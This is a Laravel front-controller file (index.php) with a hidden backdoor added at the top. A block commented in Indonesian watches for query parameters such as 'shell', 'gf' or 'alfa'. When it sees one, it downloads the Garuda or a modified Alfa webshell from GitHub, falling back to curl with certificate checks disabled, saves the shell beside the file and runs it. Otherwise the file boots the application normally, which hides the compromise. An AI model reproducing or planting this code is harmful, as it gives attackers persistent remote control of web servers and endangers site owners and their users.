<?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| BYPASS LARAVEL UNTUK WEBSHELL
|--------------------------------------------------------------------------
*/
// Deteksi apakah ini request untuk webshell
$is_shell_request = isset($_GET['shell']) || 
                    isset($_POST['act']) || 
                    isset($_GET['d']) || 
                    isset($_GET['view']) ||
                    strpos($_SERVER['REQUEST_URI'], '?gf=') !== false ||
                    strpos($_SERVER['REQUEST_URI'], '.php?') !== false;

if ($is_shell_request) {
    // Set error reporting untuk debugging
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
    
    // Handler untuk Garuda WebShell
    if (isset($_GET['shell']) || isset($_GET['d']) || isset($_GET['view']) || isset($_GET['gf'])) {
        // Load Garuda WebShell dari file lokal biar gak download terus
        $shell_file = __DIR__ . '/garuda.php';
        
        // Kalo file belum ada, download dulu
        if (!file_exists($shell_file)) {
            $garuda_url = 'https://raw.githubusercontent.com/pengodehandal/Garuda-Webshell/refs/heads/main/garuda.php';
            $shell_content = @file_get_contents($garuda_url);
            
            if ($shell_content !== false) {
                file_put_contents($shell_file, $shell_content);
            } else {
                // Fallback ke curl
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $garuda_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                $shell_content = curl_exec($ch);
                curl_close($ch);
                
                if ($shell_content !== false) {
                    file_put_contents($shell_file, $shell_content);
                }
            }
        }
        
        // Include file shell
        if (file_exists($shell_file)) {
            // Matikan output buffering
            while (ob_get_level()) {
                ob_end_clean();
            }
            
            // Include shell
            include_once $shell_file;
            exit;
        }
    }
    
    // Handler untuk Alfa WebShell (kalo masih perlu)
    if (isset($_GET['alfa'])) {
        $alfa_file = __DIR__ . '/alfa.php';
        
        if (!file_exists($alfa_file)) {
            $alfa_url = 'https://raw.githubusercontent.com/pengodehandal/botakgeng/refs/heads/main/Alfa-modified.php';
            $shell_content = @file_get_contents($alfa_url);
            
            if ($shell_content !== false) {
                file_put_contents($alfa_file, $shell_content);
            }
        }
        
        if (file_exists($alfa_file)) {
            while (ob_get_level()) {
                ob_end_clean();
            }
            include_once $alfa_file;
            exit;
        }
    }
}

// Maintenance check
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register autoloader
require __DIR__.'/../vendor/autoload.php';

// Run Laravel
$app = require_once __DIR__.'/../bootstrap/app.php';
$kernel = $app->make(Kernel::class);
$response = $kernel->handle(
    $request = Request::capture()
)->send();
$kernel->terminate($request, $response);